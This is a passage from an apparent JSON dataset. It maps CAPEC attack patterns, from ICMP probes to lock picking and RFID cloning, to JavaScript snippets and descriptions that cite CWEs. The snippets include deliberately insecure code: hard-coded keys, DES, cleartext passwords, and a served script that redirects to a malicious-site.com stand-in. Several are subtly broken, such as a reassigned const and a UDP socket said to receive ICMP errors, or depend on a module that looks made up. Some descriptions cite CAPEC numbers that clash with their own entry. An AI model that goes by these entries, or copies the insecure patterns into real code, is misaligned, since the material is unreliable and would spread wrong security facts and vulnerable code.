        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. When the server receives a message, it logs the message and the sender's address and port. It then sends back a simulated ICMP error message ('Destination Unreachable') to the sender. This code represents the main idea of the CAPEC 'ICMP Error Message Echoing Integrity Probe' by demonstrating how an adversary could generate an ICMP error message and potentially expose sensitive information. The code also touches on related CWEs, such as exposing sensitive information (CWE-200), generating error messages containing sensitive information (CWE-211), and lacking integrity checks (CWE-353)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetPort = 12345; // Closed port\nconst targetHost = '192.168.1.1';\n\nclient.send(message, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n    client.close();\n    return;\n  }\n  console.log('Message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response from ${rinfo.address}:${rinfo.port}`);\n  console.log('Response length:', msg.length);\n  console.log('Response data:', msg.toString('hex'));\n  client.close();\n});",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends an empty UDP packet to a specified closed port on a target machine. The client then listens for any ICMP 'Port Unreachable' error messages that may be returned. The code logs the length and content of the received response, which can be used to infer information about the target's operating system based on the IP header's total length field in the error message. This demonstrates the CAPEC concept of probing for IP header information and highlights CWE-204 (Observable Response Discrepancy) and CWE-130 (Improper Handling of Length Parameter Inconsistency) by showing how different responses can reveal internal state information."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello');\nconst targetPort = 12345; // Closed port\nconst targetHost = '192.168.1.1';\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received ICMP error message from ${rinfo.address}:${rinfo.port}`);\n  console.log(`Message: ${msg.toString('hex')}`);\n  // Analyze the ICMP error message for IP ID field\n  const ipID = msg.readUInt16BE(4); // Assuming IP ID is at byte offset 4\n  console.log(`Extracted IP ID: ${ipID}`);\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'ICMP IP 'ID' Field Error Message Probe' attack. It sends a UDP datagram to a closed port on a target host and listens for the ICMP error message response. The code then extracts and logs the IP ID field from the ICMP error message. This process can help an attacker fingerprint the target OS based on how the IP ID field is echoed back. The code also touches on CWE-204 (Observable Response Discrepancy) by revealing internal state information through the ICMP error message, and CWE-211 (Externally-Generated Error Message Containing Sensitive Information) by handling an error message that contains potentially sensitive information."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/event' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const userData = JSON.parse(body);\n      console.log(`User ID: ${userData.user_id}, Username: ${userData.username}`); // Logging sensitive data\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Event registered');\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/event' endpoint. When a request is received, it reads the request body, which is expected to contain JSON data with 'user_id' and 'username' fields. The server logs these sensitive details to the console, representing a potential vulnerability where sensitive information is exposed. This embodies the CAPEC idea of 'Harvesting Information via API Event Monitoring' by capturing and logging user data during an event. The code also demonstrates related CWEs: missing encryption (CWE-311), cleartext transmission (CWE-319), and exposure of sensitive information (CWE-202)."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "const sensitiveData = 'userPassword123';\n\n// CWE-311: Missing Encryption of Sensitive Data\nfetch('https://example.com/api/login', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({ password: sensitiveData })\n})\n.then(response => response.json())\n.then(data => {\n  // CWE-345: Insufficient Verification of Data Authenticity\n  if (data.authenticated) {\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    localStorage.setItem('authToken', data.token);\n  } else {\n    console.error('Authentication failed');\n  }\n})\n.catch(error => console.error('Error:', error));\n\n// CWE-471: Modification of Assumed-Immutable Data (MAID)\nObject.freeze(sensitiveData);\n\n// CWE-346: Origin Validation Error\nfunction validateOrigin(origin) {\n  const allowedOrigins = ['https://example.com'];\n  return allowedOrigins.includes(origin);\n}\n\nif (!validateOrigin(document.referrer)) {\n  console.error('Invalid origin');\n}",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Application API Message Manipulation via Man-in-the-Middle'. The code sends a user's password to a server without encryption (CWE-311), making it susceptible to interception. It then processes the server's response without verifying its authenticity (CWE-345), and stores an authentication token on the client side (CWE-602), relying on the client to enforce security. The code attempts to freeze the sensitive data to prevent modification (CWE-471), but this is ineffective as the data is already exposed. Finally, it includes a basic origin validation function (CWE-346), but this is insufficient to prevent sophisticated attacks. This snippet highlights how improper handling of data and reliance on client-side security can lead to vulnerabilities exploitable by man-in-the-middle attacks."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "const http = require('http');\nconst net = require('net');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n  req.on('end', () => {\n    // Simulate tampering with the transaction data\n    if (body.includes('transaction')) {\n      body = body.replace('amount=100', 'amount=1000'); // CWE-471: Modification of Assumed-Immutable Data\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Transaction processed');\n  });\n});\n\nserver.listen(8080, '127.0.0.1', () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});\n\n// Man-in-the-middle attack simulation\nconst client = net.createConnection({ port: 8080 }, () => {\n  client.write('POST / HTTP/1.1\\r\\n');\n  client.write('Host: 127.0.0.1\\r\\n');\n  client.write('Content-Length: 20\\r\\n');\n  client.write('\\r\\n');\n  client.write('transaction=amount=100');\n});\n\nclient.on('data', (data) => {\n  console.log(data.toString());\n  client.end();\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a transaction tampering attack via an application API. The HTTP server listens for incoming requests and processes transaction data. When a transaction request is received, the code simulates tampering by modifying the transaction amount from 100 to 1000 (CWE-471: Modification of Assumed-Immutable Data). The client part of the code simulates a man-in-the-middle attack by sending a transaction request to the server. This example highlights the vulnerability of insufficient verification of data authenticity (CWE-345) and the potential for client-side enforcement of server-side security (CWE-602). The code does not include encryption for sensitive data (CWE-311), making it easier for an attacker to intercept and modify the data."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "const userProfile = {\n  name: 'John Doe',\n  profileImage: 'https://example.com/images/johndoe.jpg'\n};\n\n// Attacker modifies the profileImage URL\nuserProfile.profileImage = 'https://attacker.com/malicious.jpg';\n\n// Function to display user profile\nfunction displayUserProfile(user) {\n  const profileContainer = document.getElementById('profile');\n  const profileImage = document.createElement('img');\n  profileImage.src = user.profileImage;\n  profileContainer.appendChild(profileImage);\n}\n\ndisplayUserProfile(userProfile);",
        "description": "This JavaScript code snippet demonstrates an 'Application API Navigation Remapping' attack. The user profile object initially contains a legitimate profile image URL. However, an attacker modifies the 'profileImage' URL to point to a malicious site. When the 'displayUserProfile' function is called, it dynamically creates an image element with the malicious URL and appends it to the profile container. This can lead to phishing attacks or redirecting users to attacker-controlled sites. The code embodies CWE-471 (Modification of Assumed-Immutable Data) by allowing the profile image URL to be altered, CWE-345 (Insufficient Verification of Data Authenticity) by not verifying the authenticity of the URL, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side code to display the profile image without server-side validation."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "const sensitiveData = 'user=admin&password=12345';\n\n// CWE-311: Missing Encryption of Sensitive Data\nfetch('https://example.com/api/login', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  },\n  body: sensitiveData // Sensitive data sent without encryption\n})\n.then(response => response.json())\n.then(data => {\n  // CWE-345: Insufficient Verification of Data Authenticity\n  if (data.authenticated) {\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    window.location.href = '/dashboard';\n  } else {\n    alert('Authentication failed');\n  }\n})\n.catch(error => console.error('Error:', error));\n\n// CWE-471: Modification of Assumed-Immutable Data\nconst originalUrl = window.location.href;\nwindow.history.pushState({}, '', '/malicious');\n\n// CWE-346: Origin Validation Error\nif (document.referrer !== 'https://trusted.com') {\n  alert('Untrusted source!');\n}",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Navigation Remapping To Propagate Malicious Content'. The code sends sensitive data (username and password) to a server without encryption (CWE-311). It then processes the server's response without verifying its authenticity (CWE-345). If the response indicates successful authentication, it redirects the user to a dashboard page, relying on client-side enforcement of server-side security (CWE-602). Additionally, the code modifies the browser's history to change the URL (CWE-471) and attempts to validate the origin of the request but does so inadequately (CWE-346). This combination of issues can be exploited by an adversary to manipulate navigation and propagate malicious content."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "function manipulateButton() {\n    // CWE-311: Missing Encryption of Sensitive Data\n    let buttonData = '{\"label\": \"Click Me\", \"url\": \"http://trusted-site.com\"}';\n    \n    // CWE-345: Insufficient Verification of Data Authenticity\n    let manipulatedData = JSON.parse(buttonData);\n    manipulatedData.url = 'http://attacker-site.com';\n    \n    // CWE-471: Modification of Assumed-Immutable Data (MAID)\n    document.getElementById('targetButton').innerHTML = manipulatedData.label;\n    document.getElementById('targetButton').setAttribute('href', manipulatedData.url);\n}\n\n// CWE-602: Client-Side Enforcement of Server-Side Security\n// Assuming the server relies on the client to enforce the integrity of the button data\nmanipulateButton();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Application API Button Hijacking' by manipulating button data on the client side. The original button data, which is assumed to be immutable, is modified to change the button's URL to an attacker-controlled destination. The code does not verify the authenticity of the data, making it vulnerable to manipulation. Additionally, the server relies on the client to enforce the integrity of the button data, which is a security flaw. This example highlights the importance of proper data validation, encryption, and server-side security enforcement to prevent such attacks."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/api/data') {\n    // Simulate client-side authentication\n    const authToken = req.headers['authorization'];\n    if (authToken === 'valid-token') {\n      // Vulnerable to content spoofing\n      const manipulatedData = '<script>window.location=\"http://malicious-site.com\"</script>';\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(manipulatedData);\n    } else {\n      res.writeHead(401, {'Content-Type': 'text/plain'});\n      res.end('Unauthorized');\n    }\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for requests to the '/api/data' endpoint. It simulates client-side authentication by checking for a specific authorization token in the request headers. If the token is valid, it responds with manipulated data that includes a script to redirect the user to a malicious site. This demonstrates the concept of 'Content Spoofing Via Application API Manipulation' (CAPEC-94) by showing how an attacker can manipulate the content of messages to include deceptive links. The code also highlights related CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602) and 'Use of Client-Side Authentication' (CWE-603), which are vulnerabilities that can be exploited to perform such attacks."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "const accessControl = (user) => {\n  if (user.hasPhysicalAccess) {\n    console.log('Access granted to sensitive information.');\n  } else {\n    console.log('Access denied.');\n  }\n};\n\nconst simulateVoltageGlitch = () => {\n  console.log('Voltage glitch detected! Bypassing security checks...');\n  accessControl({ hasPhysicalAccess: true });\n};\n\nconst simulateEMFI = () => {\n  console.log('EMFI attack detected! Disabling security mechanisms...');\n  accessControl({ hasPhysicalAccess: true });\n};\n\n// Simulate an attack\nsimulateVoltageGlitch();\nsimulateEMFI();",
        "description": "This JavaScript code snippet simulates a scenario where physical security mechanisms are bypassed through various attacks. The `accessControl` function checks if a user has physical access to grant or deny access to sensitive information. The `simulateVoltageGlitch` and `simulateEMFI` functions represent attacks that exploit vulnerabilities such as voltage glitches and electromagnetic fault injection (EM-FI) to bypass security checks and gain unauthorized access. This embodies the main idea of CAPEC-Physical Security Bypass and highlights related CWEs like improper protection against voltage glitches and EM-FI."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "class PhysicalLock {\n  constructor() {\n    this.locked = true;\n    this.debugMode = false;\n  }\n\n  unlock() {\n    if (this.debugMode) {\n      console.log('Debug mode active: Lock bypassed.');\n      this.locked = false;\n    } else {\n      console.log('Attempt to unlock failed: Access denied.');\n    }\n  }\n\n  setDebugMode(mode) {\n    this.debugMode = mode;\n  }\n}\n\n// Example usage\nconst lock = new PhysicalLock();\nlock.setDebugMode(true); // Improperly enabling debug mode\nlock.unlock(); // Bypasses the lock due to debug mode",
        "description": "This JavaScript code snippet represents a simplified model of a physical lock mechanism that can be bypassed by enabling a debug mode. The `PhysicalLock` class has a `locked` state and a `debugMode` flag. The `unlock` method checks if the debug mode is active; if it is, the lock is bypassed, otherwise, access is denied. The `setDebugMode` method allows the debug mode to be improperly enabled, simulating a scenario where an attacker can exploit debug mode to bypass security measures. This embodies the CAPEC idea of bypassing physical locks and incorporates CWE-1234 (Hardware Internal or Debug Modes Allow Override of Locks) as the main vulnerability."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "const lock = { isLocked: true, lockBit: 1, addressRegion: '0x00FF', powerState: 'ON' };\n\nfunction bumpKeyAttack() {\n  // Exploiting improper prevention of lock bit modification (CWE-1231)\n  lock.lockBit = 0; // Bump key effect: forcefully changing the lock bit\n  if (lock.lockBit === 0) {\n    lock.isLocked = false; // Unlocking the lock\n  }\n}\n\nfunction powerStateTransition() {\n  // Simulating power state transition (CWE-1232)\n  lock.powerState = 'SLEEP';\n  lock.powerState = 'ON';\n  // Registers become programmable again\n  lock.lockBit = 0; // Exploiting improper lock behavior after power state transition\n  if (lock.lockBit === 0) {\n    lock.isLocked = false; // Unlocking the lock\n  }\n}\n\n// Simulate bump key attack\nbumpKeyAttack();\nconsole.log(`Lock status after bump key attack: ${lock.isLocked ? 'Locked' : 'Unlocked'}`);\n\n// Simulate power state transition\npowerStateTransition();\nconsole.log(`Lock status after power state transition: ${lock.isLocked ? 'Locked' : 'Unlocked'}`);",
        "description": "This JavaScript code snippet simulates a lock bumping attack and a power state transition vulnerability. The lock object represents a lock with a lock bit and a power state. The bumpKeyAttack function demonstrates how an attacker can exploit improper prevention of lock bit modification (CWE-1231) by forcefully changing the lock bit to unlock the lock. The powerStateTransition function simulates a power state transition, exploiting improper lock behavior after power state transitions (CWE-1232) to unlock the lock. The code highlights the vulnerabilities in lock mechanisms that can be exploited to gain unauthorized access."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "const lock = { isLocked: true, key: '1234' }; \n\nfunction pickLock(lock) { \n  if (lock.isLocked) { \n    console.log('Picking the lock...'); \n    lock.isLocked = false; \n    console.log('Lock picked!'); \n  } else { \n    console.log('Lock is already unlocked.'); \n  } \n} \n\nfunction modifyLockBit(lock, newKey) { \n  console.log('Modifying lock bit...'); \n  lock.key = newKey; \n  console.log('Lock bit modified!'); \n} \n\nfunction accessResource(lock) { \n  if (!lock.isLocked) { \n    console.log('Accessing resource...'); \n  } else { \n    console.log('Resource is locked.'); \n  } \n} \n\n// Simulate lock picking attack \npickLock(lock); \n// Modify lock bit after picking \nmodifyLockBit(lock, '5678'); \n// Access the resource \naccessResource(lock);",
        "description": "This JavaScript code snippet simulates a lock picking attack and demonstrates vulnerabilities related to lock manipulation. The 'pickLock' function represents the lock picking process, changing the 'isLocked' state to false if the lock is initially locked. The 'modifyLockBit' function simulates the improper prevention of lock bit modification (CWE-1231) by allowing the lock's key to be changed after it has been set. The 'accessResource' function checks if the lock is unlocked before accessing a protected resource. This code embodies the main idea of the CAPEC by showing how an attacker can bypass a lock and modify its state, leading to unauthorized access."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "class Lock {\n  constructor() {\n    this.locked = true;\n    this.lockBit = 1; // Represents a lock bit\n  }\n\n  unlock() {\n    if (this.lockBit === 1) {\n      console.log('Lock is protected by lock bit.');\n    } else {\n      this.locked = false;\n      console.log('Lock is now unlocked.');\n    }\n  }\n\n  forceUnlock() {\n    // Simulate a snap gun attack by directly modifying the lock state\n    this.locked = false;\n    console.log('Lock has been forced open!');\n  }\n\n  modifyLockBit() {\n    // CWE-1231: Improper Prevention of Lock Bit Modification\n    this.lockBit = 0;\n    console.log('Lock bit has been modified.');\n  }\n}\n\nconst myLock = new Lock();\nmyLock.unlock(); // Attempt to unlock normally\nmyLock.modifyLockBit(); // Improperly modify the lock bit\nmyLock.unlock(); // Unlock after modifying the lock bit\nmyLock.forceUnlock(); // Force unlock using a snap gun technique",
        "description": "This JavaScript code snippet simulates a lock mechanism and demonstrates vulnerabilities related to lock manipulation. The `Lock` class has a `locked` state and a `lockBit` to protect the lock. The `unlock` method checks the `lockBit` before unlocking. The `forceUnlock` method simulates a snap gun attack by directly setting the lock state to unlocked, bypassing the `lockBit`. The `modifyLockBit` method represents CWE-1231 by allowing the lock bit to be improperly modified, which then allows the lock to be unlocked without proper authorization. This code embodies the main idea of the CAPEC by showing how a lock can be forced open and how improper lock bit management can lead to security vulnerabilities."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Function to encrypt data using a broken algorithm (CWE-327)\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('des-ecb', hardCodedKey); // DES is considered broken\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Simulate RFID card data\nconst rfidData = 'RFID_CARD_DATA';\n\n// Encrypt the RFID data\nconst encryptedRFID = encryptData(rfidData);\nconsole.log('Encrypted RFID Data:', encryptedRFID);\n\n// Function to simulate bypassing access control\nfunction bypassAccessControl(encryptedData) {\n  // In a real scenario, an attacker could reverse-engineer the algorithm and key\n  const decipher = crypto.createDecipher('des-ecb', hardCodedKey);\n  let decrypted = decipher.update(encryptedData, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted === rfidData;\n}\n\n// Check if access control can be bypassed\nif (bypassAccessControl(encryptedRFID)) {\n  console.log('Access Granted');\n} else {\n  console.log('Access Denied');\n}",
        "description": "This JavaScript code snippet demonstrates a simplified scenario of bypassing electronic locks and access controls by exploiting weak cryptographic practices. The code uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (DES, CWE-327) to encrypt and decrypt RFID card data. An attacker could potentially reverse-engineer the algorithm and key to decrypt the data and gain unauthorized access. This example highlights the vulnerabilities associated with using insecure cryptographic methods and hard-coded keys in electronic access control systems."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate storing a magnetic strip card number\nlet cardNumber = '1234567890123456';\n\n// Use a weak cryptographic algorithm (MD5) to hash the card number\nlet hash = crypto.createHash('md5').update(cardNumber).digest('hex');\nconsole.log('Stored Hash:', hash);\n\n// Simulate an attacker capturing and replaying the hash\nlet capturedHash = hash;\n\n// Authentication check using the captured hash\nif (capturedHash === hash) {\n  console.log('Authentication Bypassed: Access Granted');\n} else {\n  console.log('Access Denied');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation related to the deprecated CAPEC 'Bypassing Card or Badge-Based Systems' and associated CWEs. The code simulates storing a magnetic strip card number and uses a weak cryptographic algorithm (MD5) to hash the card number, representing CWE-327 (Use of a Broken or Risky Cryptographic Algorithm). An attacker captures and replays the hash, bypassing authentication (CWE-294: Authentication Bypass by Capture-replay). The code highlights the risks of using weak cryptographic algorithms and the potential for capture-replay attacks to bypass authentication mechanisms."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "const magstripeData = '1234567890123456'; // Example magstripe data\n\nclass MagstripeCard {\n  constructor(data) {\n    this.data = data;\n  }\n\n  clone() {\n    return new MagstripeCard(this.data);\n  }\n}\n\n// Simulate reading a magstripe card\nconst originalCard = new MagstripeCard(magstripeData);\nconsole.log('Original Card Data:', originalCard.data);\n\n// Clone the card to create a duplicate\nconst clonedCard = originalCard.clone();\nconsole.log('Cloned Card Data:', clonedCard.data);\n\n// Simulate using the cloned card for unauthorized access\nfunction useCard(card) {\n  if (card.data === magstripeData) {\n    console.log('Access Granted');\n  } else {\n    console.log('Access Denied');\n  }\n}\n\nuseCard(clonedCard);",
        "description": "This JavaScript code snippet demonstrates the concept of cloning magnetic strip cards to gain unauthorized access, as described in the CAPEC. The `MagstripeCard` class represents a magnetic strip card containing sensitive data. The `clone` method allows for duplicating the card, embodying CWE-498 (Cloneable Class Containing Sensitive Information). The `useCard` function simulates using the cloned card to gain access, highlighting the vulnerability of magstripe technology to unauthorized duplication. This example underscores the ease with which an attacker can clone a magstripe card and use it for unauthorized access."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Simulate reading data from a magnetic strip card\nfunction readCardData(card) {\n  // Use a broken cryptographic algorithm (CWE-327)\n  const decipher = crypto.createDecipher('aes-128-ecb', hardCodedKey);\n  let decrypted = decipher.update(card, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n}\n\n// Simulate brute force attack by generating new card data (CWE-307)\nfunction bruteForceCardData(card1, card2) {\n  const data1 = readCardData(card1);\n  const data2 = readCardData(card2);\n  // Generate new card data by combining sequences from both cards\n  const newCardData = data1.slice(0, 8) + data2.slice(8);\n  return newCardData;\n}\n\n// Example card data (hex encoded)\nconst card1 = 'a1b2c3d4e5f67890';\nconst card2 = '1234567890abcdef';\n\n// Generate new card data\nconst newCard = bruteForceCardData(card1, card2);\nconsole.log('New Card Data:', newCard);",
        "description": "This JavaScript code snippet demonstrates a simplified version of a magnetic strip card brute force attack. It reads data from two magnetic strip cards, decrypts the data using a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (CWE-327), and then generates new card data by combining sequences from both cards. This process simulates the generation of new cards containing valid sequences that allow unauthorized access and/or impersonation of individuals, as described in the CAPEC. The code also highlights the vulnerability of improper restriction of excessive authentication attempts (CWE-307) by showing how easily new card data can be generated."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "const rfidData = '1234567890ABCDEF'; // Simulated RFID data\n\nfunction cloneRFID(data) {\n  // Insecure Security Identifier Mechanism (CWE-1294)\n  const securityIdentifier = data.slice(0, 4); // Simplistic and insecure\n\n  // Incorrect Decoding of Security Identifiers (CWE-1290)\n  const decodedIdentifier = parseInt(securityIdentifier, 16); // Incorrect decoding\n\n  // Observable Behavioral Discrepancy (CWE-207)\n  if (decodedIdentifier === 0x1234) {\n    console.log('Access Granted');\n  } else {\n    console.log('Access Denied');\n  }\n\n  // Use of Multiple Resources with Duplicate Identifier (CWE-694)\n  const resources = [\n    { id: '1234', name: 'Resource1' },\n    { id: '1234', name: 'Resource2' } // Duplicate identifier\n  ];\n\n  return resources;\n}\n\nconst clonedData = cloneRFID(rfidData);\nconsole.log(clonedData);",
        "description": "This JavaScript code snippet simulates the cloning of an RFID card by using a simplistic and insecure method to handle security identifiers. The `cloneRFID` function takes RFID data, extracts a security identifier, and decodes it incorrectly. It then checks the decoded identifier to grant or deny access, demonstrating an observable behavioral discrepancy. Additionally, it shows the use of multiple resources with duplicate identifiers. This code embodies the main idea of CAPEC-170 (Cloning RFID Cards or Chips) and highlights related weaknesses such as insecure security identifier mechanisms, incorrect decoding, and the use of duplicate identifiers."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "class RFIDChip {\n  constructor() {\n    this.active = true;\n    this.sensitiveData = 'Sensitive Information';\n  }\n\n  deactivateChip() {\n    // CWE-1191: No access control for deactivation\n    this.active = false;\n    console.log('RFID Chip deactivated');\n  }\n\n  injectError() {\n    // CWE-1334: Unauthorized error injection\n    if (this.active) {\n      this.active = false;\n      console.log('Error injected, chip deactivated');\n    }\n  }\n\n  sendAlert() {\n    // CWE-1320: Improper protection for outbound error messages\n    if (!this.active) {\n      console.log('Alert: RFID Chip is inactive');\n    }\n  }\n\n  scrubData() {\n    // CWE-1266: Improper scrubbing of sensitive data\n    this.sensitiveData = null;\n    console.log('Sensitive data scrubbed');\n  }\n\n  decodeSecurityIdentifier(identifier) {\n    // CWE-1290: Incorrect decoding of security identifiers\n    if (identifier === 'trusted') {\n      console.log('Access granted');\n    } else {\n      console.log('Access denied');\n    }\n  }\n}\n\n// Example usage\nconst rfid = new RFIDChip();\nrfid.deactivateChip();\nrfid.injectError();\nrfid.sendAlert();\nrfid.scrubData();\nrfid.decodeSecurityIdentifier('untrusted');",
        "description": "This JavaScript code snippet represents an RFID chip class with methods that embody the vulnerabilities described in the CAPEC and related CWEs. The `deactivateChip` method demonstrates a lack of access control (CWE-1191), allowing anyone to deactivate the chip. The `injectError` method shows how an unauthorized error injection can deactivate the chip (CWE-1334). The `sendAlert` method simulates improper protection for outbound error messages (CWE-1320), where alerts are sent without proper security. The `scrubData` method represents improper scrubbing of sensitive data (CWE-1266), and the `decodeSecurityIdentifier` method demonstrates incorrect decoding of security identifiers (CWE-1290). This code highlights the main idea of the CAPEC by showing how an attacker can deactivate or destroy an RFID chip using these vulnerabilities."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "const fs = require('fs');\nconst hardwareAccess = require('hardware-access');\n\n// Simulate improper physical access control\nif (fs.existsSync('/dev/hardware')) {\n  // Simulate improper restriction of software interfaces to hardware features\n  hardwareAccess.enableDebugMode();\n  \n  // Simulate improper protection against voltage and clock glitches\n  hardwareAccess.setVoltage(5.0);\n  hardwareAccess.setClockSpeed(3.0);\n  \n  // Simulate hardware allowing activation of test or debug logic at runtime\n  hardwareAccess.activateTestMode();\n  \n  // Simulate improper protection of physical side channels\n  const sensitiveData = hardwareAccess.readSensitiveData();\n  console.log('Sensitive Data:', sensitiveData);\n}",
        "description": "This JavaScript code snippet simulates a scenario where an adversary exploits various hardware vulnerabilities to gain unauthorized access and manipulate hardware components. The code checks for the existence of a hardware device, then proceeds to enable debug mode, manipulate voltage and clock settings, activate test mode, and finally read sensitive data. This embodies the main idea of the CAPEC 'Physically Hacking Hardware' by demonstrating how improper physical access control and other related weaknesses (CWEs) can be exploited to undermine system integrity."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "const hardCodedPassword = 'defaultPassword';\n\nfunction authenticate(password) {\n  if (password === hardCodedPassword) {\n    return true;\n  }\n  return false;\n}\n\nfunction updatePassword(newPassword) {\n  // Missing proper authorization check\n  hardCodedPassword = newPassword;\n  console.log('Password updated successfully');\n}\n\n// Simulate an unauthorized password update\nif (authenticate('wrongPassword')) {\n  console.log('Authenticated');\n} else {\n  console.log('Authentication failed');\n  updatePassword('newPassword'); // Bypassing authentication\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can bypass ATA password security. The `authenticate` function checks if the provided password matches a hard-coded password. The `updatePassword` function allows updating the password without proper authorization checks. This simulates the scenario where an attacker can bypass authentication and update the password, similar to how an ATA protected drive can be exploited by hot swapping. The code highlights CWE-285 (Improper Authorization) and CWE-259 (Use of Hard-coded Password) by showing how an attacker can bypass security mechanisms due to improper authorization checks and the use of hard-coded credentials."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  // Log request details\n  fs.appendFile('server.log', `Request: ${req.url}\\n`, (err) => {\n    if (err) throw err;\n  });\n\n  // Simulate authentication bypass\n  if (req.url === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server logs all incoming requests to a file named 'server.log', which can lead to information exposure through server log files (related to deprecated CWE-533). Additionally, the code contains a simulated authentication bypass vulnerability (related to deprecated CWE-592) by allowing access to the '/admin' route without proper authentication checks. This snippet embodies the main idea of the deprecated CAPEC-118 by demonstrating how information can be gathered and analyzed (through logging) and how security weaknesses (like authentication bypass) can be exploited."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
